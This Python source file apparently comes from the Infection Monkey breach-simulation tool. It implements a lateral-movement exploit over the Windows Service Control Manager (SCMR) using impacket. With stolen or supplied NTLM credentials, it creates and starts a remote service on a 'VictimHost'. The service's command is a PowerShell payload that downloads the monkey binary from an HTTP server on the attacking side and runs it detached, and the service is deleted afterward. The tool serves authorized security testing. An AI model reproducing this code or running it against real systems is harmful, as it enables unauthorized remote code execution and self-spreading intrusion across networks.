import time

from impacket import ntlm
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.rpcrt import DCERPCException
from impacket.dcerpc.v5.scmr import MSRPC_UUID_SCMR, DCERPCSessionError

from common.common_consts.timeouts import MEDIUM_REQUEST_TIMEOUT
from common.utils.exceptions import FailedExploitationError, CredentialsError
from infection_monkey.exploit.tools.binary_uploading_tools.monkey_binary_server import MonkeyBinaryServer
from infection_monkey.exploit.tools.cmd_factories import DownloadParams, RunParams
from infection_monkey.exploit.tools.cmd_factories.cmd import wrap_in_cmd
from infection_monkey.exploit.tools.cmd_factories.powershell import download_and_run
from infection_monkey.exploit.tools.helpers import build_monkey_commandline, get_monkey_depth
from infection_monkey.exploit.tools.impacket_helpers.creds_dto import NtlmCreds
from infection_monkey.exploit.tools.impacket_helpers.scmr_finder import ScmrFinder
from infection_monkey.model import VictimHost


class ScmrApi:

    def __init__(self, host: VictimHost):
        self.host = host
        self.scmr_binding = ScmrFinder(ip_addr=self.host.ip_addr).get_scmr_stringbinding()

    def check_credentials(self, creds: NtlmCreds):
        with ScmrHandle(self.scmr_binding, creds) as handle:
            handle.is_valid_credentials()

    def run_monkey(self,
                   credentials: NtlmCreds,
                   dst_monkey_path: str,
                   service_name: str):
        with MonkeyBinaryServer(self.host) as monkey_http_path:
            payload = ScmrPayloadBuilder.get_scmr_payload(self.host, monkey_http_path, dst_monkey_path)

            with ScmrHandle(self.scmr_binding, credentials) as scmr_handle:
                success = scmr_handle.run_cmd_via_service(service_name=service_name,
                                                          cmd=payload)
                if not success:
                    raise FailedExploitationError(f"Failed uploading monkey to the {self.host.ip_addr}.")


class ScmrPayloadBuilder:

    def __init__(self, host):
        self.host = host

    @staticmethod
    def get_scmr_payload(host, src_http_path, dst_os_path):
        powershell_cmd = ScmrPayloadBuilder._build_powershell_cmd(host, src_http_path, dst_os_path)
        return wrap_in_cmd(powershell_cmd)

    @staticmethod
    def _build_powershell_cmd(host, monkey_http_path: str, dst_monkey_path: str) -> str:
        download_args = DownloadParams(dst_path=dst_monkey_path,
                                       src_http_path=monkey_http_path)
        run_options = build_monkey_commandline(target_host=host,
                                               depth=get_monkey_depth() - 1,
                                               vulnerable_port=None,
                                               location=dst_monkey_path)
        run_args = RunParams(path=dst_monkey_path,
                             detached_run=True,
                             run_options=run_options)
        return download_and_run(download_params=download_args,
                                run_params=run_args)


class ScmrHandle:
    def __init__(self, string_binding: str, credentials: NtlmCreds):
        self.string_binding = string_binding
        self.credentials = credentials
        self.service_handle = None

    def __enter__(self):
        rpc_transport = transport.DCERPCTransportFactory(self.string_binding)
        rpc_transport.set_credentials(*self.credentials)
        self.scmr_rpc = rpc_transport.get_dce_rpc()
        self.scmr_rpc.connect()
        self.scmr_rpc.set_auth_level(ntlm.NTLM_AUTH_PKT_PRIVACY)
        self.scmr_rpc.bind(MSRPC_UUID_SCMR)
        return self

    def is_valid_credentials(self):
        try:
            scmr.hROpenSCManagerW(self.scmr_rpc)
        except DCERPCException as e:
            raise CredentialsError(f"Invalid SCMR credentials: {e}")

    def run_cmd_via_service(self, service_name, cmd) -> bool:
        resp = scmr.hROpenSCManagerW(self.scmr_rpc)
        sc_handle = resp['lpScHandle']
        resp = scmr.hRCreateServiceW(self.scmr_rpc, sc_handle, service_name, service_name,
                                     lpBinaryPathName=cmd)
        self.service_handle = resp['lpServiceHandle']
        try:
            scmr.hRStartServiceW(self.scmr_rpc, self.service_handle)
            return True
        except DCERPCSessionError as e:
            # Expect this error, monkey still running
            if e.error_code == 1053:
                return True
        except Exception as e:
            return False

    def __exit__(self, exc_type, exc_val, exc_tb):
        # Wait until service is no longer used
        time.sleep(MEDIUM_REQUEST_TIMEOUT)
        if self.service_handle:
            scmr.hRDeleteService(self.scmr_rpc, self.service_handle)
            scmr.hRCloseServiceHandle(self.scmr_rpc, self.service_handle)
            self.scmr_rpc.disconnect()
